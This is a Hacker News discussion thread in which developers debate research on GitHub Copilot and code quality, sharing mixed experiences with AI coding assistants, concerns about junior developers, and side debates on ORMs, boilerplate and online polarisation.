    "commentBody": "New GitHub Copilot research finds 'downward pressure on code quality' (visualstudiomagazine.com)387 points by ceejayoz 15 hours agohidepastfavorite280 comments web3-is-a-scam 12 hours agoI cancelled my subscription after 2 months because I was spending way too much mental effort going over all of the code vomit fixing all of the mistakes. And it was basically useless when trying to deal with anything non-trivial or anything to do with SQL (even when I frontloaded it with my entire schema). It was much less effort to just write everything myself because I actually know what I want to write and fixing my own mistakes was easier than fixing the bot’s. I weep for the juniors that will be absolutely crushed by this garbage. reply ben_w 12 hours agoparent> I cancelled my subscription after 2 months because I was spending way too much mental effort going over all of the code vomit fixing all of the mistakes. And it was basically useless when trying to deal with anything non-trivial or anything to do with SQL (even when I frontloaded it with my entire schema). Good to know, that means I'm still economically useful. I'm using ChatGPT rather than Copilot, and I'm surprised by how much it can do, but even so I wouldn't call it \"good code\" — I use it for JavaScript, because while I can (mostly) read JS code, I've spent the last 14 years doing iOS professionally and therefore don't know what's considered best practice in browser-land. Nevertheless, even though (usually) I get working code, I can also spot it producing bad choices and (what seems like) oddities. > I weep for the juniors that will be absolutely crushed by this garbage. Indeed. You avoid the two usual mistakes I see with current AI, either thinking it's already game over for us or that it's a nothing-burger. For the latter, I normally have to roll out a quote I can't remember well enough to google, that's something along the lines of \"your dog is juggling, filing taxes, and baking a cake, and rather than be impressed it can do any of those things, you're complaining it drops some balls, misses some figures, and the cake recipe leaves a lot to be desired\". reply godelski 11 hours agorootparent> You avoid the two usual mistakes I see with current AI, either thinking it's already game over for us or that it's a nothing-burger. This is always really surprising to me that it appears to be these two camps. Though what frustrates me is that if you suggest something in the middle people usually assume you're in the opposite camp than they are. It reminds me a lot of politics and I'm not sure why we're so resistant to nuance when our whole job is typically composed of nuance. Though I'll point out, I think it is natural to complain about your juggling dog dropping balls or making mistakes on your taxes. That doesn't mean you aren't impressed. I think this response is increasingly common considering these dogs are sold as if they are super-human at these tasks. That's quite disappointing and our satisfaction is generally relative to expectations, not actual utility. If you think something is shit and it turns out to be just okay, you're happy and feel like you got a bargain. If you're expecting something to be great but it turns out to be just okay, you're upset and feel cheated. But these are different than saying the juggling dog is a useless pile of crap and will never be useful. I just want to make that clear, so we avoid my first paragraph. reply dasil003 5 hours agorootparent> It reminds me a lot of politics and I'm not sure why we're so resistant to nuance when our whole job is typically composed of nuance. My theory is the increase in available information is overwhelming everyone's cognitive abilities, and so jumping to reductive conclusions is just a natural defense mechanism, leading to increased polarization and reduced listening/tolerance skills. Certainly software engineers have an above-average tolerance for nuance, but even we have to pick our battles or risk drowning in the flood. reply godelski 2 hours agorootparentI buy that one, but I think there's a coupling with metric availability. Where we have measurements for pretty much everything but people don't know measurements are proxies and not always aligned with goals. Like how a ruler doesn't measure meters, but meters according to the ruler and only at the ruler's precision level. I can totally get how people who don't work with these tools don't understand the nuances, but it confuses me with experts. Isn't expertise, by definition, contingent upon understanding nuance? It seems that the more metrics we have available to us, the less we care about understanding how those metrics work and what their limitations are. That they just become black boxes. I mean there seems to be a very common belief that you can measure visual image quality by measuring some difference between an intermediate representation of a classification model. Or a belief that entropy measures quality of speech. I'm really concerned that Goodhart's Law might be one of the Great Filters. reply arretevad 4 hours agorootparentprevI agree and hold a similar theory. The human mind prefers to put things in boxes. And the simpler the box, the better. reply godelski 2 hours agorootparentThere also seems to be a phenomena where the more complex the system the simpler the box must be. I'm kinda surprised by this as understanding complexities (especially around dynamic environments and future planning) seems to be one of the things that distinguishes humans from other animals. And opposable thumbs. I mean sure, there's other animals with those too but we stand out, literally. reply beautron 1 hour agorootparentIf the box is simple, then it's easier to cast each individual complexity of the system, as needed, into an interpretation that fits and reinforces the box. reply Shorel 2 hours agorootparentprevWhat makes a man turn neutral? What makes a man turn neutral? Lust for gold? Power? Or were you just born with a heart full of neutrality? -- Zapp Brannigan reply eggdaft 2 hours agorootparentprevPolarisation in general can be well-explained by the business models of social media. You’re shown content that you react to strongest, and that is usually one end of a spectrum of views. reply dotandgtfo 1 hour agorootparentNot only are you shown content that you react the strongest too, people create content that they react strongly too, continuing the cycle. A user with a balanced interpretation and somewhat neutral feelings about a topic generally won't feel like they want to add something to a discussion. A user with strong opinion will more likely engage with someone with posts with the opposite viewpoint or the same viewpoint. HN is a bit of an exception because the community is reasonably high quality. But major platforms? The people who bother to write out long and neutral posts learned there is nothing to gain from doing that years ago. reply starbugs 1 hour agorootparent> HN is a bit of an exception Even here, depending on the felt \"hotness\" of the topic in the community, you might get a lot of negative sentiment for trying to find a middle ground or daring to look at generalized claims in more detail. I think, in general, people now seem to require you to signal that you share their identification with a certain thought before an open discussion might become possible. One important aspect seems to be that the higher your educational level, the more likely you are conditioned to identify with your own thoughts. This amplifies polarization on an intellectual level. There is something in it for the individual thinker taking on a new polarized belief. It adds to their identity. The ultimate catch then is to take the position that I just outlined as an identity contrary to \"all\" others who are polarized. This is yet another trap. Hence, the exercise is to practice not getting polarized while being compassionate to those who are. It's just a tendency of the human mind and nobody should be judged for falling for these traps. It's too easy to fall for it given our current conditioning. reply HKH2 2 hours agorootparentprevI think it pays to just point out good use cases. For me, it's a superpowered thesaurus, a more concise and relevant Wikipedia, and an excellent listicle generator. AI is not all-powerful, but those things alone help me a lot when I'm brainstorming. reply hinkley 9 hours agorootparentprevHistory says that the things in the middle, usually ones with the clearest computational model beneath them, get a fancy name and we stop calling it AI and we just call it algorithms. I could see someone making a case for this being that 'middle' group but there's a sour note to this process that I don't know from one week to the next whether I find it sneaky or delightful. Someone else can make that argument, because I'm so sick of silver bullets and gold rushes that I just. don't. care. Sturgeon's Law applies (90% of everything is crap) and I'll listen just enough to see if anyone is proposing which bits are the 10% to keep a finger on the scale if I think it'll matter. But let everyone else bleed over this, because in another ten years they'll be laughing about how silly they were to think this was going to solve all of our problems or end our profession. Software is eating most things. If something eats software, your employability will be the least of your existential crises. reply coldtea 8 hours agorootparent>History says that the things in the middle, usually ones with the clearest computational model beneath them, get a fancy name and we stop calling it AI and we just call it algorithms. I've heard this before, but do we? Which were those this from the past that we \"stopped called AI and we just call algorithms\"? I see three categories: (1) very complex algorithms that we never did call \"AI\". (2) stuff we did call AI, and we still do - things like expert systems, or IBM's Watson, or game AI. We knew, and still know, that those weren't AGI. (3) some stuff promoted as AI (like the \"AI assistant\" Clippy), but which, marketing materials aside, nobody really considered AI or called them that. But I don't remember this demoting/relabelling of stuff from AI to \"just algorithms\". It might have happened with some stuff, but I doubt it was a \"classic\" development as its portrayed. reply Izkata 6 hours agorootparentOffhand, things that used to just be \"AI\": Expert systems, markov chains, genetic algorithms, data mining, and identification/classification. People in the field would probably say they fall under the AI umbrella, but it's not the common viewpoint. Either someone can conceptualize how they'd work (expert systems) or they've been watered down and turned commonplace (markov chains in software keyboards, identification in Facebook images), and either way it disassociates the technology with the \"intelligence\" part of \"artificial intelligence\", so is no longer thought of as part of it. reply subarctic 6 hours agorootparentprevInteresting, usually when I express my opinion in the middle people agree. I've only talked to people about chatgpt, ai etc in real life though, not on the internet reply TOMDM 6 hours agorootparentI think the real life aspect changes things a lot. Zealots on either side communicate at 100 times the rate of people who aren't so heavily invested. reply kcrwfrd_ 10 hours agorootparentprevAs a senior frontend/javascript guy, I’m afraid that relying on ChatGPT/copilot for _current best practices_ is probably where it works the worst. Oftentimes it will produce code that’s outdated. Or, it will output code that seems great, unless you have an advanced understanding of the browser APIs and behaviors or you thoroughly test it and realize it doesn’t work as you hoped. But it’s pretty good at getting a jumpstart on things. Refining down to best practices is where the engineer comes in, which is what makes it so dicey in the hands of a jr dev. reply sdm 7 hours agorootparent> I’m afraid that relying on ChatGPT/copilot for _current best practices_ is probably where it works the worst This matches my experience. When ChatGPT started going viral, I started getting a lot of PRs from juniors who where trying it out. Pretty much every single one was using depreciated API calls or best practices from 5-10 years ago. I'd ask why they chose to use an API that is scheduled to be removed in the next release of whatever library or system we are using. ChatGPT does have it's place. But you need to understand the tools you're using. It can't be great for a first spike or just getting something working. But then you have to go and look at what it's doing and make sure you understand it. reply noogle 6 hours agorootparentprevThe criticism from the second camp stems from the fact that the WHOLE job is to not drop anything. A fence with a hole is useless even if it's 99% intact. A lot of human jobs, especially white collar, are about providing reassurance about the correctness of the results. A system that cannot provide that may be worse than useless since it creates noise, false sense of security and information load. reply hinkley 9 hours agorootparentprevIf there are patterns that are good, idiomatic, and mostly repeatable, we should be putting those into the standard library, not an AI tool. What we have right now is a system to collect information about the sorts of problems developers want existing code to solve for them. We should embrace it. reply antod 6 hours agorootparentprev>For the latter, I normally have to roll out a quote I can't remember well enough to google, that's something along the lines of \"your dog is juggling, filing taxes, and baking a cake, and rather than be impressed it can do any of those things, you're complaining it drops some balls, misses some figures, and the cake recipe leaves a lot to be desired\". Not the quote, but there was a Farside cartoon along those lines where the dog was being berated for not doing a very good job mowing the lawn: https://i.pinimg.com/originals/22/22/79/222279ceaa98f293e76e... reply seagullriffic 4 hours agorootparentOh no, a really sad Far Side cartoon! Which is very closely related to a shaggy dog joke you can spin out for ages, \"$5 talking dog for sale\", which ends with the setup / punchline, \"why so cheap?\" / \"because he's a goddamn liar!\" reply agumonkey 11 hours agorootparentprevThe value I found in my short trial of gpt3 was a bidirectional path finder. Don't have me read 20 pages of docs just to integrate into a browser or a framework.. cutting the legwork essentially so I can keep my motivation and inspiration going. reply Mawr 4 hours agorootparentprev> You avoid the two usual mistakes I see with current AI, either thinking it's already game over for us or that it's a nothing-burger. A lot of the latter is caused by the former. It is a nothing burger compared to the shocking amount of hysteria on HN about AI putting programmers out of a job. You'd expect a programmer to know what his job is, but alas, apparently even programmers think of themselves as glorified typewriters. reply blibble 11 hours agorootparentprev> and therefore don't know what's considered best practice in browser-land. wanting this is probably the worst possible use case for LLM code vomit reply mvdtnz 10 hours agorootparentI feel like if I ever try something less trivial than generating a wedding speech in the style of HP Lovecraft some AI evangelist tells me I've chosen the wrong use case for an LLM. reply chipotle_coyote 8 hours agorootparentThat is because you have already found the ideal use case for one. reply ben_w 10 hours agorootparentprevFor a sense of scale, the last time my JS knowledge was close to familiar with the best practices of the day, was 1-1.5 years prior to the release of jQuery. I way trying to say how ChatGPT is good in relative terms, not absolute. reply firecall 9 hours agorootparentprevRight now, for me, it’s fancy Auto Complete at best. I get a Free subscription to it by using my kids EDU email accounts. Which is handy :) But I absolutely would not pay for it. I recall the last time I tried using the chat feature to do something, the code it produced wasn’t very useful and it referenced chapters from a book for further information. It was clearly just regurgitating code from a book on the subject, and that just feels wrong to me. At least give credit to the Authors and reference the book so I can go read the suggested chapters LOL reply philwelch 11 hours agorootparentprev> For the latter, I normally have to roll out a quote I can't remember well enough to google, that's something along the lines of \"your dog is juggling, filing taxes, and baking a cake, and rather than be impressed it can do any of those things, you're complaining it drops some balls, misses some figures, and the cake recipe leaves a lot to be desired\". Something can be very impressive without actually being useful, but that still doesn’t make it useful. There’s no market for a working dog that does a bad job of baking cakes and filing taxes, while dogs that can retrieve game birds or tackle fleeing suspects are in high demand. reply andy99 11 hours agorootparentThis is the crux of most of modern AI. Nobody debates it's cool. Since 2014 or so there has been no shortage of amazing demos of computers doing stuff many thought wasn't possible or required human level intelligence. But there's not automatically a bridge from those demos to commercial relevance, no matter how amazing. reply godelski 11 hours agorootparentprevI'm certainly impressed by a man that can dig a tunnel with a spoon. But you're definitely right that it's not that useful. But I disagree that half assed work is not useful. It's just lower usefulness. My laundry app isn't even half assed. The programmers couldn't even sort the room list (literal random order) or cache your most recent room. It's still better than the BS system they had before where I had to load a prepaid card and that machine was locked in a building that isn't open on weekends or after 6pm. I'm still immensely frustrated, but I don't want to go back to the old system. Though I'll mention that my fear is that because so many people see LLMs as having far more utility than they offer, we'll get more shit like the above instead of higher quality stuff. Most issues are solved for me to be comfortable in my life, so I definitely value quality a lot more. Plus, reduces a lot of mental stress as I'm not thinking \"how can the person that made this be so dumb? How do you learn how to program and not know what sort is?\" reply varispeed 12 hours agorootparentprev> I'm surprised by how much it can do, but even so I wouldn't call it \"good code\" You can tell it the code is bad and how, a lot of the times it will correct it. For some bs code that you have to write it is a great time saver. reply ben_w 12 hours agorootparent> You can tell it the code is bad and how, a lot of the times it will correct it. For some bs code that you have to write it is a great time saver. Yes, I've even done that to see how well it works (my experience is that half the time it fixes the code, the other half it claims to but doesn't) — but I can do that because I can recognise that it's bad code. I don't expect a junior to notice bad code, and therefore I don't expect them to ask for a fix. (I've also spent 6 months in a recent job just fixing code written by work experience students). reply varispeed 11 hours agorootparent> I don't expect a junior to notice bad code That is true. I actually seen instances of juniors struggling with code that doesn't work and frankly doesn't make sense, but they claim they wrote it :) reply aleph_minus_one 10 hours agorootparentprev> You can tell it the code is bad and how, a lot of the times it will correct it. For the code questions that I ask, it is sometimes quite non-trivial to check whether the code is correct or not. It never happened in my tests that it could correct incorret code that it generated. Typically, the bot then generated code that is wrong for sometimes a different and sometimes even a similar reason. > For some bs code that you have to write it is a great time saver. Again I disagree: the common case where you have to write BS code is when the abstraction is wrong. Implementing a proper abstraction that strongly reduces the BS code to write is the way to go. reply mewpmewp2 2 hours agorootparentWriting that abstraction can also feel BS. reply Syntaf 12 hours agoparentprevAs with most things in life, moderation is key. I find co-pilot primarily useful as an auto-complete tool to save keystrokes when writing predictable context driven code. Writing an enum class in one window? Co-pilot can use that context to auto complete usage in other windows. Writing a unit test suite? Co-pilot can scaffold your next test case for you with a simple tab keystroke. Especially in the case of dynamic languages, co-pilot nicely compliments your intellisense reply choilive 10 hours agorootparentYep, treat copilot like a really good autocomplete system and its wonderful. Saves a lot of time and typing even in languages that aren't known for having a lot of boilerplate. Treat copilot to solve actual problems (y'know, the kind of stuff you are presumably paid to solve), and it falls completely flat. reply craig 9 hours agorootparentI've found it's autocomplete really bad. It often hallucinates import paths and other illegal operations. It's not clear to me why it can't leverage the LSP better. reply Aeolun 9 hours agorootparentprevIt’s also nice for solving small things like ‘euclidian distance’ reply thehours 11 hours agorootparentprevMy experience is similar. This week I created a few DBT models and Co-Pilot saved a *ton* of keystrokes on the YML portion. It needed some hand-holding in the early parts, but it was so satisfying to tab autocomplete entire blocks of descriptions and tests once it picked up context with my preferences. reply chrismorgan 6 hours agoparentprev> I weep for the juniors that will be absolutely crushed by this garbage. This is the real danger of this sort of thing. When your Copilot or whatever are good enough that they replace what is vastly superior for purely economic reasons. I wrote about this trend applied to the unfortunately inevitable doom of the voice acting industry in favour of text-to-speech models a couple of months ago, using my favourite examples of typesetting, book binding and music engraving: https://news.ycombinator.com/item?id=38491203. But when it’s development itself that gets hollowed out like this, I’m not sure what the end state is, because it’s the developers who led past instances of supplanting. Some form of societal decline and fall doesn’t feel implausible. (That sentence really warrants expansion into multiple paragraphs, but I’m not going to. It’s a big topic.) reply thepasswordis 11 hours agoparentprevOh man this is the opposite of my experience! Copilot has replaced almost all of the annoying tedious stuff, especially stuff like writing (simple) SQL queries. “Parse this json and put the fields into the database where they belong” is a fantastic use case for copilot writing SQL. (Yes I’m sure there’s an ORM plugin or some middleware I could write, but in an MVP, or a mock-up, that’s too much pre optimization) reply JBorrow 7 hours agorootparentAn ORM is not too much pre optimisation… reply mewpmewp2 2 hours agorootparentORMs can be annoying to use in my experience, especially with more complex queries, joins, counts, filtering by joins etc. And they make debugging harder usually. reply dgan 1 hour agorootparentI don't know, i don't think ever came across something I wasn't able to express in SQLAlchemy... And I prefer all the goodies that come with it than writing raw sql reply crabmusket 5 hours agorootparentprevYeah MVPs and mockups is exactly what ORMs are for, since they get you the first 80% for very little effort. Maybe it depends on the language, but this is definitely the way Rails and Laravel style framework ORMs are designed. reply mewpmewp2 1 hour agorootparentTo me SQL is better for MVPs. It is transparent and clear, easy to debug and can do easily whatever joins, filtering you want to. ORM is more for future, because it abstracts away the database implementation, so you could in theory change the db or change some behaviour more simply. E.g. if you add something like deleted_at column, ORM can have a single place where to configure system to use it, but if you have SQL queries lying around you may need to find all spots to add that to your where clauses everywhere. But otherwise SQL is easier to work with in my view. reply crabmusket 1 hour agorootparentWhat ORMs/languages do you usually work with? Dynamic language ORMs usually let you very easily add filters, work with relationships, etc. reply mewpmewp2 1 hour agorootparentI started out with Laravel 10 years ago, but now I have been in the NodeJS Ecosystem for recent 5 years, so I've been working with different things, but lately mostly with Supabase, which has its own REST API abstraction, but now I've been lately starting to prefer just having a direct bare postgres client against it. This is for my own side projects/MVPs. reply alexanderchr 1 hour agorootparentprevYeah I’ve found both Eloquent (Laravel ORM) and Entity Framework to be more than flexible enough and to produce surprisingly good SQL. You do need to keep an eye on the queries if produces though because innocent changes can make a huge difference in performance. reply Yodel0914 10 hours agoparentprevWhen I've tried codepilot and similar tools, I've found them rather unimpressive. I assumed it was because I hadn't put the time in to learn how to make the best use of it, but maybe it's just that it's not very good. On the other hand, I use ChatGPT (via the API) quite often, and it's very handy. For example, I wrote a SQL update that needed to touch millions of rows. I asked ChatGPT to alter the statement batch the updates, and then asked it to log status updates after each batch. As another example, I was getting a 401 accessing a nuget feed from Azure DevOps - I asked ChatGPT what it could be and it not only told me, but gave me the yaml to fix it. In both cases, this is stuff I could have done myself after a bit of research, but it's really nice to not have to. reply j4yav 53 minutes agoparentprevI think there is a sweet spot where if you're junior on the cusp of intermediate it can help you because you know enough to reject the nonsense, but it can point you in the right direction. Similar to if you need to implement a small feature in a language you don't know, but basically know what needs to get done. I've definitely seen juniors just keep refining the garbage until it manages to pass a build and then try to merge it, though, and using it that way just sort of makes you a worse programmer because you don't learn anything and it just makes you more dependent on the bot. Companies without good code reviews are just going to pile this garbage on top of garbage. reply atoav 1 hour agoparentprevI never even started. On a vacation I tried to get a LLM to write me an interpolation function for two hours. I had a test data set and checks laid out. Not a single of the resulting algorithms passed all the checks, most didn't even do what I asked for and a good chunk didn't even run. LLMs give you plausible text. That does not mean it is logically coherent or says what it should. reply WithinReason 10 hours agoparentprevI'm not using Copilot to write code, I use it for autocomplete. For that it's great. reply zarzavat 2 hours agorootparentCopilot probably saved my career. I was getting occasional wrist pain due to keyboard overuse, but the autocomplete is so good that my keyboard use is a tiny fraction of what it was previously. Wrist pain gone. Using Copilot is a skill though, you have to live with it and learn its limits and idiosyncrasies to get the most out of it. reply valcron1000 8 hours agorootparentprev100% agree. It usually autocompletes better than the language's LSP since it takes a lot of context into consideration. It's a godsend for repetitive tasks or trivial stuff. reply keeganpoppen 9 hours agoparentprevit's crazy how amazing it is sometimes for certain things, including comments (and including my somewhat pithy style of comment prose), and how incredible and thorough the wastes of time when it autosuggests some function that is plausible, defined, but yet has some weird semantics such that it subtly ruins my life until i audit every line of code i've written (well, \"written\", i suppose). i finally disabled it, but doing so _did_ make me kind of sad-- it is nice for the easy things to be made 25x easier, but, for programming, not at the expense of making the hard stuff 5x harder (note i didn't say 10x, nor 100x. 5x). it's not that it's that far away from being truly transformative, it's just that the edge cases are really, really rough because for it to be truly useful you have to trust it pretty much completely & implicitly, and i've just gotten snakebitten in the most devious ways a handful of times. an absolute monster of / victim of the pareto principle, except it makes the \"90%\" stuff 1.5x easier and the \"10%\" stuff 5x harder (yes, i know i haven't been using my \"k%\"s rigorously) (and for those keeping score at home, that adds up to making work 10% harder net, which i'd say is about right in my personal experience). highlights: \"the ai\" and i collaboratively came up with a new programming language involving defining a new tag type in YAML that lets one copy/paste from other (named) fragments of the same document (as in: `!ref /path/to/thing to copy`) (the turing completeness comes from self-referential / self-semi-overlapping references (e.g. \"!ref /name/array[0:10]`) where one of the elements thus referred-to is, itself, a \"!ref\" to said array). lowlights: as already alluded to, using very plausible, semi-deprecated API functions that either don't do what you think they do, or simply don't work the way one would think they do. this problem is magnified by googling for said API functions only to find cached / old versions of API docs from a century ago that further convince you that things are ok. nowadays, every time i get any google result for a doc page i do a little ritual to ensure they are for the most recent version of the library, because it is absolutely insane how many times i've been bitten by this, and how hard. reply l5870uoo9y 11 hours agoparentprevThis is the problem with using AI for generating SQL statements; it doesn't know the semantics of the your database schema. If you are still open for a solution, I recently deployed a solution[1] that combines AI, db schema and simple way train AI to know your database schema. Essentially, you \"like\" correct (or manually corrected) generations and a vectorized version is stored and used in future similar generations. An example could be tell which table or foreign key is preferred for a specific query or that is should wrap columns in quotes. From my preliminary tests it works well. I was able to consistently make it use correct tables, foreign keys and quotes on table/column name for case-sensitivity using only a couple of trainings. Will open a public API for that soon too. [1]: https://www.sqlai.ai/ reply tilwidnk 11 hours agorootparentIt's \"a public API\", not \"an public API\", because of the consonant rule. I really worry that there are people out there who will anxiously mangle their company's data thinking what is being called AI, which doesn't exist yet, will save the day. reply l5870uoo9y 10 hours agorootparentUse it as a tool not a replacement. However it does do things well even without much additional information like fixing SQL statement[1]. That being said it is consistently improving, GPT-3.5 to GPT-4 was a major upgrade. [1]: https://www.sqlai.ai/snippets/clroq0qn9001xqzqeidtm4jgx reply dehrmann 8 hours agoparentprev> It was much less effort to just write everything myself because I actually know what I want to write and fixing my own mistakes was easier than fixing the bot’s. Echoing this, it takes longer to read code than to write it, so generally, if you know what you want to write and it's non-trivial, you'll spend more time groking AI-written code for correctness than writing it from scratch. reply ringofchaos 1 hour agoparentprevDepends on how you use it. I use a similar vscode assistant bit only for shorter code. I am able to complete code faster than an instructor on video. reply crabmusket 5 hours agoparentprev> It was much less effort to just write everything myself because I actually know what I want to write This aligns with my observations. I don't use Copilot etc. but the other devs on my small team do. I've observed that I'm generally a faster and more confident type and coder - not knocking their skills, I'm just more experienced, and also spent my teens reading and writing a lot. I've seen that it helps them in cases where they're less certain what they're doing, but also when they know what they're doing and it's quicker about it. reply mewpmewp2 1 hour agorootparentFor me I know what I want to write and it seems that Copilot also knows what I want to write, so as an auto complete it just works out for me. Most of the time code I want to write is in my head, I just need to be able to quickly vomit it out and typing speed is the bottleneck. I am also able to intuitively predict that it is going to vomit out exactly what I want. E.g. I know ahead of time what the 10 lines it will give me are. reply ec109685 9 hours agoparentprevIf you used copilot in the beginning (and I think still with some plans), it was only GPT 3.5. Likely you’d get much better results with GPT-4. reply theshrike79 3 hours agorootparentThe difference in output code quality in 3.5 vs 4 is staggering - just with using regular old ChatGPT. reply AuryGlenz 2 hours agorootparentI feel like OpenAI is really shooting themselves in the foot by not having some sort of trial of 4. The difference in quality of everything is huge and most people don’t know it. reply arthur_sav 3 hours agoparentprevFor me it's useful for new languages that I'm not familiar with, saves a lot of googling time and looking up the docs. reply marcyb5st 11 hours agoparentprevAs other said I use copilot or similar for scaffolding/boilerplate code. But you are right, reading almost correct code that you are unfamiliar with is much more demanding than fixing stuff I got wrong to begin with. reply cqqxo4zV46cp 10 hours agoparentprevIt sounds to me like you were getting it to do too much at once. reply godelski 11 hours agoparentprevI have similar sentiment and looking at how mixed takes are, I think it depends on what you do. I write a lot of research code so I think it's unsurprising that GPT isn't too good here. But people I see that write code more in line with the \"copy and paste from stackoverflow\" style, get huge utility out of this. (This isn't a dis on that style, lots of work is repetitive and redundant). So I changed how I use GPT (which I do through API. Much cheaper btw). I use it a lot like how I would use SO in the first place. Get outlines, understand how certain lines might work (noisy process here), generate generic chunks of code especially from modules I'm unfamiliar with. A lot of this can just be seen as cutting down time searching. So, the most useful one: using it as a fuzzy search to figure out how to Google. This one is the most common pattern. Since everything on Google is so SEO optimized and Google clearly doesn't give a shit, I can ask GPT a question, get a noisy response that contains useful vernacular or keywords which I can then use to refine a Google search and actually filter out a decent amount of shit. I think people might read this comment and think that you should just build a LLM into Google, but no, what's going on is more complicated and requires the symbiosis. GPT is dumb, doesn't have context, but is good at being a lossy compression system. The whole reason this works is because I'm intelligent and __context aware__, and importantly, critical of relying on GPT's accuracy[0]. Much of this can't be easily conveyed to GPT and isn't just a matter of token length. So that said, the best way to actually improve this system is actually for Google to just get its shit together or some other search engine to replace them. Google, if you're listening, the best way you can make Google search better with LLMs is to: 1) stop enabling SEO bullshit, 2) throw bard into the side and have the LLM talk to you to help you refine a search. Hell, you can use a RL agent for 1 to just look how many times I back out from the links you send me or look at which links I actually use. Going to page 2 is a strong signal that you served shit. [0] accuracy is going to highly depend on frequency of content. While they dedupe data for training, they don't do great semantic deduping (still an unsolved problem. Even in vision). So accuracy still depends on frequency and you can think of well known high frequency knowledge as having many different versions, or that augmentation is built in. You get lower augmentation rates with specific or niche expert knowledge as there's little baked in augmentation and your \"test set\" is much further from the distribution of training data. reply balaji1 5 hours agoparentprevso its good my card that was auto-paying for the Copilot subscription expired reply teaearlgraycold 12 hours agoparentprevReally? I've been doing web dev as a hobby for 20 years and professionally for 6 or 7 years. It's super helpful for me giving how much boilerplate there is to write and how much of the training set is for websites. Any time I try to get it to write non-trivial SQL or TypeScript types it fails hard. But it's still a nice time saver for writing tests, request handling, React boilerplate, etc. reply louthy 12 hours agorootparentThis is the problem. As programmers we should be focusing effort on reducing boilerplate, so that it’s never needed again. Instead, we’ve created a boilerplate generator. reply CuriouslyC 12 hours agorootparentThe challenge there is that reducing boilerplate comes with opinionated magic, which rubs a lot of people the wrong way. So the creators add configs and code level config, and pretty soon you're back in boilerplate hell. reply Aeolun 9 hours agorootparentprevI’m starting to lean in the direction that trading some boiletplate for flexibility is a good deal. reply teaearlgraycold 11 hours agorootparentprevNope. The wrong abstraction is too risky vs. having no abstraction. AI can let us move towards an abstraction-free mode of coding. In the future you’ll tell the AI “add a 60 second cache to every source of X data” and it’ll scour your source code for matching code and you’ll review the diffs. C programmers would review LLVM IR diffs. Web devs will review whatever compilation target they’re using. We use high level languages because they improve reading comprehension and save us time when writing. Having a copilot take on a major role allows us to fundamentally rethink programming. reply norir 11 hours agorootparentI find it unlikely that we would be asking the ai for a very specific caching design. If the optimists are right, the ai should be able to do its own analysis and automatically design an architecture that is superior to what a human would be able to do. A job spent mostly reviewing ai generated diffs sounds like a level of hell beyond even Dante's imagination. reply louthy 10 hours agorootparentprev> We use high level languages because they improve reading comprehension and save us time when writing. Which completely contradicts your earlier point. Why not just get copilot write assembly for you? Or, spit out raw machine code? Oh, that’s right, because you need to check that it hasn’t fucked something up. Which, when there’s a ton of boilerplate, is hard. It’s arguable that programming language evolution stopped around the time Java was released (barring a few sprinkles here and there, like async/await, affine/linear types, etc.) We haven’t had a major leap in language power for decades (not like the leap from assembly to procedural languages) - I believe it’s because Java popularised evolution through libraries - and for a long time that was fine, even if it did lead to language evolution stagnating. But now we’ve hit a complexity threshold that demands an abstraction leap, but instead of looking for that abstraction leap we’re getting a computer to generate boilerplate for us, hoping it will dig us out of the complexity hole. We’re still ways off having a computer maintain a complex code base over many years. So humans still have to do that. It’d be much easier if we remove the incidental complexity. “The purpose of abstraction is not to be vague, but to create a new semantic level in which one can be absolutely precise.” — Edsger W. Dijkstra reply throwaway2037 7 hours agorootparent> We haven’t had a major leap in language power for decades I call bullshit. Haskell, Rust, and Zig (and others) are revolutionary. Also: Rust and Zig are facilitated by LLVM. reply tmtvl 44 minutes agorootparentHaskell is over 30 years old and I don't know if it really was a major leap over SML. Rust is basically an ML with a borrow checker, it's cool but not really a major leap in power over C++ (maybe a leap in freedom from bugs). What does Zig do that's so revolutionary? Custom allocators are nothing new. And compile-time evaluation has been around so long some of us forgot we had it. Also Zig is working to step off LLVM. reply throwaway2990 6 hours agoparentprevYou cancelled the tool because you didn’t know how to use it? reply havaloc 12 hours agoprevUsing GPT-4 has significantly enhanced the efficiency of my work. My focus is primarily on developing straightforward PHP CRUD applications for addressing problems in my day-to-day job. These applications are simple, and don't use frameworks and MVC structures, which makes the code generated by GPT-4, based on my precise instructions, easy to comprehend and usually functional right out of the prompt. I find if I listen to the users needs I can make something that addresses a pain point easily. I often request modifications to code segments, typically around 25 lines, to alter the reporting features to meet specific needs, such as group X and total Y on this page. GPT-4 responds accurately to these requests. After conducting a quick QA and test, the task is complete. This approach has been transformative, particularly effective for low-complexity tasks and clear-cut directives. This process reminds me of how a senior programmer might delegate: breaking down tasks into fundamental components for a junior coder to execute. In my case, GPT-4 acts as the junior programmer, providing valuable assistance at a modest cost of $20 per month. I happily pay that out of pocket to save myself time. However, much like how a younger version of myself asked why we had to learn math if the calculator does it for us, I know understand why we do that. I think the same thing applies here. If you don't know the fundamentals, you won't be effective. If GPT-4 had been around when I learned to write PHP (don't @ me!), I probably wouldn't understand the fundamentals as well as I do. I have the benefit of learning how to do it before it was a thing, and then benefitting from the new tool being available. I also don't find the code quality to be any less, if anything what it spits out is a bit more polished (sometimes!). reply kromem 7 hours agoparentYeah, a lot of times it has better code quality, but more subtle bugs than what I'd be prone to produce. I think a lot of the criticisms are premature, and it's more a stumbling step forward with need for support from additional infrastructure. Where's the linter integration so it doesn't spit out a result that won't compile? Where's the automatic bug check and fix for low hanging fruit errors? What should testing look like or change around in a gen AI development environment? In general, is there something like TDD or BDD that is going to be a better procedural approach to maximizing the gains to be had while minimizing the costs? A lot of the past year or two has been dropping a significant jump and change in tech into existing workflows. Like any tool, there's the capabilities of the tool itself and the experience of the one wielding it that come together to make the outcome. The industry needs a lot more experience and wisdom around incorporation of gen AI in development before we'll realistically have a sense of its net worth. I'd say another 2-3 years at least - not because the tech will take that long to adapt, but because that's how long the humans will take to have sufficiently adapted. reply hackernewds 11 hours agoparentprevprecisely. we are very lucky to be during the timeline where ChatGPT was released during our later years, that we didn't have to compete with auto created code during our learning formative years. reply NoPicklez 7 hours agorootparentI can see both points. But I agree with this one more so, I did programming as part of my Comp Sci degree and my job doesn't require any programming. I didn't particularly like programming and would end up with 20+ tabs of various questions being asked with most of my time spend finding an answer to my question having to troll through what was often the cesspool of stackoverflow. But having a tool where I can ask it questions about my code, code in general is hugely beneficial. I can write a block of code, or have it write a block of code, then have it explain to me how it's meant to be working. If I don't understand a particular component I can contextually ask it more questions. I appreciate the expectation of code quality is higher in production, but from a personal learning standpoint for a learner its great. reply WanderPanda 10 hours agorootparentprevThis sounds like motivated reasoning to me. Having an above-average personal tutor that doesn't get mad or tired 24/7 every time seems like a big multiplier reply quonn 10 hours 